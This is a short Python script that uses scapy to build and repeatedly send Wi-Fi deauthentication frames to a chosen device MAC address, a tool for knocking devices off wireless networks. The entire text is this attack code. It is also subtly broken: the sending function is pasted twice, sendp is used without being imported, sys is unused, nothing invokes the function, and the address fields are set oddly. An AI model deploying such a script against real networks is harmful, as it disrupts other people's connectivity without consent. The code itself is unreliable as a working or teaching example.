from scapy.all import RadioTap, Dot11, Dot11Deauth
import sys
import time
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC address for de-auth
INTERFACE = "wlan0"  # Network interface to use for sending packets (adjust as needed)
def send_deauth(target_mac, count=1):
    # Craft the de-authentication packet
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=BROADCAST_MAC, addr3=BROADCAST_MAC) / Dot11Deauth()

    # Send the packet
    for i in range(count):
        print(f"Sending de-authentication packet to {target_mac}")
        sendp(packet, iface=INTERFACE, verbose=False)
        time.sleep(0.1)  # Small delay between packets (adjust as needed)
def send_deauth(target_mac, count=1):
    # Craft the de-authentication packet
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=BROADCAST_MAC, addr3=BROADCAST_MAC) / Dot11Deauth()

    # Send the packet
    for i in range(count):
        print(f"Sending de-authentication packet to {target_mac}")
        sendp(packet, iface=INTERFACE, verbose=False)
        time.sleep(0.1)  # Small delay between packets (adjust as needed)
